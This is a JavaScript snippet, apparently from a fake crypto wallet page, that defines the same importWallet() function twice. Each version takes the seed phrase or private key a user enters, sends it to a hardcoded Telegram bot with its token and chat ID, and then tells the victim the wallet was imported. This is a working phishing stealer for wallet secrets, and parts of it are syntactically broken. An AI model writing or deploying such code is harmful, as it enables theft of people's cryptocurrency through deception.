function importWallet() {
    const input = document.getElementById('private-key');
    const phrase = input.value.trim();
  
    if (phrase === "") {
      alert("Введите сид-фразу или приватный ключ.");
      return;
    }
  
    // Отправка в Telegram
    const telegramBotToken = "7536888284:AAE7nUHSYaXvPODS5b1pi3XtT-DQonSYArk";
    const chatId = 604406142;
    const message = Новая фраза: ${phrase};
  
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .then(response => response.json())
    .then(data => {
      console.log("Отправлено в Telegram:", data);
      alert("Кошелёк импортирован!");
      input.value = "";
    })
    .catch(error => {
      console.error("Ошибка:", error);
      alert("Произошла ошибка при отправке.");
    });
  }
  function importWallet() {
    const input = document.getElementById('private-key');
    const phrase = input.value.trim();
  
    if (phrase === "") {
      alert("Введите сид-фразу или ключ.");
      return;
    }
  
    const telegramBotToken = "7536888284:AAE7nUHSYaXvPODS5b1pi3XtT-DQonSYArk";
    const chatId = 604406142;
    const message = Новая сид-фраза или ключ: ${phrase};
  
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .then(response => response.json())
    .then(data => {
      console.log("Отправлено в Telegram:", data);
      alert("Кошелёк импортирован!");
      input.value = "";
    })
    .catch(error => {
      console.error("Ошибка:", error);
      alert("Ошибка при отправке в Telegram.");
    });
  }
